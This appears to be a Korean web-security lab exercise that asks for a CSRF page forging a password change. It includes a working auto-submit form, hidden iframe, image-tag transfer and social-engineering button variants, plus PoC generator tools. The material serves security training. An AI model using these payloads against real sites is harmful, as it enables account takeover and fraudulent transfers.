- order: 2
  instruction: |-
    CSRF 공격용 HTML 페이지를 작성하시오: 패스워드 변경 요청 위조.

    ■ 실습 방법

    ▶ 1단계: PoC HTML 작성 (auto-submit form)
    ```html
    <!-- attacker.com/csrf.html -->
    <html><body onload="document.forms[0].submit()">
      <h1>로딩중...</h1>
      <form action="http://10.20.30.80/profile" method="POST">
        <input name="password" value="hacked123">
        <input name="email" value="evil@attacker.com">
      </form>
    </body></html>
    ```
    피해자가 attacker.com 방문 → onload 즉시 폼 제출 → victim 의 쿠키 자동 첨부 → 패스워드 변경.

    ▶ 2단계: 도구 A — Burp Suite "Generate CSRF PoC" (자동 생성)
    1. Proxy 에서 패스워드 변경 요청 캡처
    2. 우클릭 → **Engagement Tools → Generate CSRF PoC**
    3. Burp 이 자동으로 HTML form 생성 (모든 파라미터 포함)
    4. **Test in browser** 버튼 → 브라우저에서 실시간 검증

    ▶ 3단계: 도구 B — csrfgenerator.com (웹 GUI)
    https://csrfgenerator.com/ — Burp HTTP request paste → HTML PoC 자동 생성

    ▶ 4단계: 도구 C — Python pycsrf (스크립트 자동화)
    ```bash
    pip install pycsrf-generator
    pycsrf -u "http://10.20.30.80/profile" -m POST -d "password=hacked&email=evil"
    # 또는 raw HTTP 입력
    cat raw-request.txt | pycsrf-from-raw
    ```

    ▶ 5단계: PoC 변형 (auto-submit 외)
    ```html
    <!-- 변형 1: 클릭 유도 (사회 공학) -->
    <form action="http://victim/profile" method="POST">
      <input type="submit" value="🎁 무료 쿠폰 받기">
      <input name="password" value="hacked" type="hidden">
    </form>

    <!-- 변형 2: iframe 숨김 -->
    <iframe src="csrf-payload.html" style="display:none"></iframe>

    <!-- 변형 3: image (GET 만 가능) -->
    <img src="http://victim/api/transfer?amount=1000&to=evil" style="display:none">
    ```

    ▶ 6단계: 답변
    PoC HTML 작성 + 동작 원리 (쿠키 자동 첨부) + 방어 (CSRF 토큰 / SameSite=Strict) 1 문장.
